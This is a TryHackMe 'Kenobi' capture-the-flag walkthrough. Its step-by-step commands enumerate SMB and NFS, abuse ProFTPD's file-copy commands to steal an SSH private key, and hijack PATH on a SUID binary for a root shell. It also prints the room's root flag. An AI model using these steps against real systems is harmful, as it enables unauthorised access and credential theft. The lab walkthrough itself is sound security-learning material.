---
title: "TryHackMe - Kenobi"
published: 2026-08-15
description: "TryHackMe Kenobi writeup — SMB and NFS enumeration, ProFTPD file-copy exploit to steal an SSH key, and privilege escalation via PATH hijacking on a SUID binary."
image: "/assets/kenobi/cover.png"
tags: [TryHackMe, Linux, SMB, NFS, ProFTPD, SSH Key Theft, PATH Hijacking, Privilege Escalation]
category: "TryHackMe"
draft: false
lang: "en"
---

**Machine:** Kenobi

**Difficulty:** Easy

**Techniques:** SMB Enumeration, NFS Enumeration, FTP Misconfiguration, SSH Key Theft, SUID Abuse, PATH Hijacking, Privilege Escalation

# Kenobi Room - Walkthrough Notes

## Target Information

**IP Address:** `10.10.177.254`

---

## 1. Initial Enumeration

### Nmap Service and Script Scan

```bash
nmap -sV -sC 10.10.177.254
```

### Port Discovery with RustScan

```bash
rustscan -a 10.10.177.254
```

---

## 2. SMB Enumeration

Enumerate SMB shares and users:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.177.254
```

Connect to the anonymous SMB share:

```bash
smbclient //10.10.177.254/anonymous
```

Download the exposed file:

```bash
get log.txt
```

Exit the SMB session:

```bash
exit
```

Review the contents of `log.txt` for useful information.

---

## 3. NFS Enumeration

Enumerate NFS exports:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.177.254
```

Display exported shares:

```bash
showmount -e 10.10.177.254
```

---

## 4. FTP Service Analysis

Search for known vulnerabilities:

```bash
searchsploit ProFTPD 1.3.5
```

Connect to the FTP service:

```bash
nc 10.10.177.254 21
```

Use the ProFTPD file copy functionality to copy Kenobi's SSH private key into an accessible location:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

---

## 5. NFS Mount and SSH Key Retrieval

Mount the exported NFS share:

```bash
sudo mount 10.10.177.254:/var nfs
```

Navigate to the temporary directory:

```bash
cd nfs
cd tmp
```

Copy the retrieved private key:

```bash
cp id_rsa ~/
```

Return and unmount the share:

```bash
cd ..
cd ..
sudo umount nfs
```

Set correct permissions on the private key:

```bash
chmod 600 id_rsa
```

---

## 6. User Access

Authenticate as Kenobi using the private key:

```bash
ssh -i id_rsa kenobi@10.10.177.254
```

Retrieve the user flag:

```bash
cat user.txt
```

---

## 7. Privilege Escalation Enumeration

Search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

A custom SUID binary is discovered:

```
/usr/bin/menu
```

---

## 8. PATH Hijacking

Move to a writable directory:

```bash
cd /tmp
```

Create a malicious replacement for `curl`:

```bash
echo /bin/sh > curl
chmod 777 curl
```

Modify the PATH variable:

```bash
export PATH=/tmp:$PATH
```

Execute the vulnerable SUID binary:

```bash
/usr/bin/menu
```

Select option:

```
1
```

The binary executes the attacker-controlled `curl`, resulting in a root shell.

---

## 9. Root Access

Verify privileges:

```bash
whoami
```

Expected output:

```
root
```

Navigate to the root directory:

```bash
cd /root
```

Retrieve the root flag:

```bash
cat root.txt
```

---

## Root Flag

```
177b3cd8562289f37382721c28381f02
```

---

# Summary

1. Performed service enumeration using Nmap and RustScan.
2. Enumerated SMB shares and downloaded an exposed log file.
3. Discovered NFS exports and accessible directories.
4. Identified a vulnerable ProFTPD service.
5. Copied Kenobi's SSH private key into an NFS-accessible location.
6. Mounted the NFS share and retrieved the private key.
7. Logged in as user `kenobi`.
8. Enumerated SUID binaries and identified a custom privileged program.
9. Exploited a PATH hijacking vulnerability.
10. Obtained root privileges and retrieved the root flag.

**Machine:** Kenobi

**Difficulty:** Easy

**Techniques:** SMB Enumeration, NFS Enumeration, FTP Misconfiguration, SSH Key Theft, SUID Abuse, PATH Hijacking, Privilege Escalation